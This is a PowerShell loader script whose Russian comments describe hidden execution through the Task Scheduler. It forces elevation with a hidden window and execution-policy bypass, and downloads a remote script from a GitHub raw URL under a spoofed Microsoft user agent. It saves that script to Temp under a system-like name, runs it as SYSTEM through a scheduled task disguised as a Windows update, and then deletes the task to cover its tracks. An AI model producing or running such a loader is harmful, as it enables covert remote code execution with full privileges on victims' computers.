# --- СКРЫТОЕ ВЫПОЛНЕНИЕ ЧЕРЕЗ ПЛАНИРОВЩИК ---

# 1. Подавляем ошибки
$ErrorActionPreference = "SilentlyContinue"

# 2. Проверка админки (и тишина)
$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
$AdminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

if (-not ($Principal.IsInRole($AdminRole))) {
    # Запуск от админа
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}

# 3. Настройки
$Url = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheak.ps1"
# Прячем в Temp под системным именем
$ScriptPath = "$env:TEMP\sys_update.ps1" 

# 4. Скачиваем (маскируемся под WebClient)
try {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.Headers.Add("User-Agent", "Microsoft-CryptoAPI")
    $Payload = $WebClient.DownloadString($Url)
    
    # Сохраняем на диск
    Set-Content -Path $ScriptPath -Value $Payload -Force
} catch {
    exit
}

# 5. Создаем задачу в Планировщике для СКРЫТОГО запуска
# Это запустит скрипт от имени SYSTEM, без окон и пинги пойдут от системного процесса
$TaskName = "WindowsSystemUpdateTask"
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) # Запустить сразу
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Регистрируем задачу (или обновляем, если есть)
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null

# Запускаем задачу
Start-ScheduledTask -TaskName $TaskName

# Ждем секунду, чтобы задача стартовала, и удаляем саму задачу (чтобы не висела мусором)
Start-Sleep -s 2
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false

# Удаляем скачанный скрипт после запуска (следы)
# Remove-Item $ScriptPath -Force -ErrorAction SilentlyContinue 

exit